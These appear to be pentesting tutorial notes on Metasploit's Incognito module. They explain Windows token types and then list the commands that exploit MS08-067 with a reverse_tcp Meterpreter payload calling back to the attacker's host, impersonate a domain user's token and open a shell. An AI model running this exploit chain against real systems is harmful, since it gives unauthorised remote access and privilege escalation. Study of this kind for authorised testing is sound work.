* **Incognito Overview**  
  Incognito allows token impersonation to gain privileges without credentials. Tokens are like temporary keys (similar to cookies) that allow access. Types of tokens:  
  - **Delegate tokens**: Created for interactive sessions (e.g., RDP).  
  - **Impersonate tokens**: For non-interactive sessions (e.g., network drives).  
  Tokens persist until reboot and allow privilege escalation.  

* **Using Incognito in Meterpreter**  
  1. **Load exploit and set target**:
     ```bash
     msf > use exploit/windows/smb/ms08_067_netapi
     msf exploit(ms08_067_netapi) > set RHOST <target IP>
     msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
     msf exploit(ms08_067_netapi) > set LHOST <your IP>
     msf exploit(ms08_067_netapi) > set TARGET 8
     msf exploit(ms08_067_netapi) > exploit
     ```
     After successful exploitation:
     ```bash
     meterpreter >
     ```

  2. **Load Incognito module**:
     ```bash
     meterpreter > use incognito
     ```

  3. **List available tokens**:
     ```bash
     meterpreter > list_tokens -u
     ```

  4. **Impersonate a token**:
     ```bash
     meterpreter > impersonate_token <DOMAIN\\User>
     ```

  5. **Check current user**:
     ```bash
     meterpreter > getuid
     ```

  6. **Run a shell as impersonated user**:
     ```bash
     meterpreter > shell
     C:\WINDOWS\system32> whoami
     ```

